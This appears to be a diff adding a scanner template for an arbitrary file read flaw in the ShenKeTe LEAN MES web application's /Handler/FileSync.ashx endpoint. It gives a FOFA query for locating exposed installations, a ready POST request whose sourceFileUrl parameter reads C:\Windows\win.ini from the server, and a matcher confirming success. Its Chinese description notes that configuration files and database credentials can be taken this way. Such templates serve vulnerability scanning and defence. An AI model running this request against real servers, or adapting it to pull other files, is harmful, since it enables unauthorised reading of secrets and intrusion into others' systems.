@@ -1,0 +1,30 @@
+id: ShenKeTe-LEAN-MES-FileSync_ashx-File-Reading
+
+info:
+  name: 深科特 LEAN MES /Handler/FileSync.ashx 任意文件读取
+  author: HuanXiong
+  severity: medium
+  description: |-
+    fofa: (title="LEAN MES - 用户登录" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+    深科特 LEAN MES /Handler/FileSync.ashx 接口存在任意文件读取漏洞。攻击者可通过构造恶意的请求，读取服务器上的敏感文件。成功利用此漏洞可能导致攻击者获取系统配置文件、数据库凭证等敏感信息，对系统安全构成威胁。
+  reference:
+    - 
+  tags: file-reading, shenkete, leanmes
+
+http:
+  - raw:
+      - |
+        POST /Handler/FileSync.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
+        
+        type=DownLoad&sourceFileUrl=C:\\Windows\\win.ini
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code==200 && contains_all(body,'; for 16-bit app support','fonts')"
